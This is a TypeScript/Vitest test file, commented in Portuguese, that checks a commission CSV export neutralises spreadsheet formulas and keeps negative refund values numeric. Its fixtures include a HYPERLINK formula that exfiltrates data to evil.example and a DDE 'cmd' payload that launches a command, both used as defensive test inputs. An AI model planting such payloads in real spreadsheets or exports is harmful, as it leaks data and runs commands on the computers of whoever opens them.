/**
 * Análise de segurança de 05/10/2026: o CSV financeiro de comissões saía sem
 * neutralizar fórmula. O `legal_name` da conta é digitado pelo representante
 * comercial e o admin abre o arquivo no Excel: uma célula começando em `=`, `+`,
 * `-` ou `@` vira fórmula (exfiltração por HYPERLINK, execução de comando por DDE).
 *
 * A régua tem uma armadilha própria: o estorno é um valor NEGATIVO, e a
 * neutralização padrão põe um apóstrofo na frente de `-`, o que transformaria
 * `-150.5` em texto e o tiraria da soma da planilha. Número sai cru.
 */
import { describe, it, expect, vi } from 'vitest';
import { criarSupabaseMock } from '../../helpers/supabase-mock';

const evento = (extra: Record<string, any> = {}) => ({
  representante: { name: 'Rep Teste' },
  account: { trade_name: null, legal_name: 'Escola Modelo Ltda' },
  proposal: { proposal_number: 'P-2026-014' },
  type: 'commission', status: 'accrued', reference_month: '2026-10',
  base_value: 10000, percent: 5, amount: 500,
  expected_payment_date: '2026-11-05', invoice_number: 'NF-77', paid_at: null,
  ...extra,
});

let eventos: any[] = [];
const sb = criarSupabaseMock({ lista: (tabela: string) => (tabela === 'sales_commission_events' ? eventos : []) });
vi.mock('@/lib/supabase', () => ({ createSupabaseAdmin: () => sb.client }));
vi.mock('@/lib/sales/permissions', () => ({ requireCommercialAdminAction: async () => ({}) }));
vi.mock('@/lib/sales/commissions', () => ({ draftChargebackEvent: () => ({}) }));

const { exportComissoesCSV } = await import('@/actions/sales/commissions-admin');

async function csv(...linhas: any[]) {
  eventos = linhas;
  const r: any = await exportComissoesCSV();
  expect(r.success).toBe(true);
  return (r.csv as string).split('\n');
}

describe('exportComissoesCSV: neutraliza fórmula em texto e preserva número', () => {
  it('🔴 `=HYPERLINK(...)` no nome da conta vira texto, com apóstrofo na frente', async () => {
    const [, linha] = await csv(evento({ account: { legal_name: '=HYPERLINK("http://evil.example/?x="&A1;"clique")' } }));
    expect(linha).toContain(`"'=HYPERLINK(""http://evil.example/?x=""&A1;""clique"")"`);
    expect(linha.split(';')[1].startsWith('"\'=')).toBe(true);
  });

  it.each(['+cmd|\' /C calc\'!A0', '-2+3', '@SUM(A1:A9)', '  =1+1'])('🔴 nome de representante começando por %j não vira fórmula', async (nome) => {
    const [, linha] = await csv(evento({ representante: { name: nome } }));
    const celula = linha.split(';')[0];
    expect(celula.startsWith('"\'')).toBe(true);
  });

  it('o estorno (valor negativo) continua número, sem apóstrofo', async () => {
    const [, linha] = await csv(evento({ type: 'chargeback', base_value: -10000, percent: 5, amount: -150.5 }));
    const c = linha.split(';');
    expect(c[6]).toBe('-10000');
    expect(c[8]).toBe('-150.5');
    expect(linha).not.toContain("'-");
  });

  it('o resto do arquivo segue igual: separador ;, cabeçalho e valores comuns', async () => {
    const [cab, linha] = await csv(evento());
    expect(cab).toBe('representante;cliente;proposta;tipo;status;competencia;base;percent;valor;previsao_pagamento;nota_fiscal;pago_em');
    const c = linha.split(';');
    expect(c).toHaveLength(12);
    expect(c[0]).toBe('"Rep Teste"');
    expect(c[1]).toBe('"Escola Modelo Ltda"');
    expect(c[6]).toBe('10000');
    expect(c[8]).toBe('500');
  });

  it('ponto e vírgula, aspas e quebra de linha dentro do texto não quebram a coluna', async () => {
    const lin = await csv(evento({ account: { legal_name: 'A; "B"' } }));
    expect(lin[1]).toContain('"A; ""B"""');
  });
});
